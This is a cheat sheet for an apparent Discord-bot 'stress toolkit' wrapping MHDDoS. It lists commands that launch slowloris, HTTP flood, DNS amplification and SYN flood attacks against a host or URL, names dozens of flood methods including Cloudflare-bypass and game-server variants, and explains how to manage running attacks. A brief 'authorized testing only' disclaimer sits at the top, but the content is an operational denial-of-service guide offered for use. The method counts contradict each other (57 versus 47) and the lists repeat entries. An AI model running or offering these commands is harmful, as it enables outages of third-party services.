# EdgeIQ Stress Toolkit — Cheat Sheet

> ⚠️ **Authorized testing only.** Never use against targets without explicit permission.

## Quick-Start Commands

| Command | Description |
|---------|-------------|
| `!stress slowloris <host> [port] [sockets] [duration]` | Slowloris DoS (default: port 80, 200 sockets, 300s) |
| `!stress httpflood <url> [threads] [duration]` | HTTP GET flood (default: 100 threads, 300s) |
| `!stress dnsflood <ip:port> [threads] [duration]` | DNS amplification flood |
| `!stress GET https://target.com 100 300` | Generic L7 flood via MHDDoS |
| `!stress SYN 1.2.3.4:80 100 300` | Generic L4 flood via MHDDoS |

## Attack Management

| Command | Description |
|---------|-------------|
| `!stress list` | List all active/recent attacks |
| `!stress status <id>` | Status + last output of specific attack |
| `!stress stop <id>` | Stop a running attack |
| `!stress methods` | Show all 47 available methods |

## MHDDoS — 57 Methods

### Layer 4 (L4) — Targets: `IP:port`
```
TCP, UDP, SYN, ICMP, NTP, DNS, MEM, MCPE, MCBOT,
MINECRAFT, VSE, TS3, ARD, FIVEM, FIVEM-TOKEN, OVH-UDP,
CLDAP, CHAR, CPS, CONNECTION, RDP, OVH-RESP, STRESS
```

### Layer 7 (L7) — Targets: `https://example.com`
```
GET, POST, HEAD, Slow, STOMP, DYN, NULL, COOKIE,
CFB, CFBUAM, AVB, BOT, APACHE, XMLRPC, BYPASS, DGB,
DOWNLOADER, GAMING, RHEX, STRESS, EVEN, KILLER, PPS,
TOR, BOMB, OVH, GSB, SYN, DYN, GET, POST, COOKIE,
CFB, XMLRPC, etc.
```

## Attack IDs
- `mh-{timestamp}` — MHDDoS attack
- `sl-{timestamp}` — slowloris attack

## Target Format
- **L4:** `1.2.3.4:80` or `hostname:port`
- **L7:** `http://example.com` or `https://example.com` or just `example.com`

## Tools Located At
- Script: `/home/guy/.openclaw/workspace/apps/stress-tools/discord_stress_command.py`
- MHDDoS: `/home/guy/.openclaw/workspace/apps/stress-tools/MHDDoS/`
- venv: `/home/guy/.openclaw/workspace/apps/stress-tools/venv/`
- State: `/home/guy/.openclaw/workspace/apps/stress-tools/.attack_state.json`
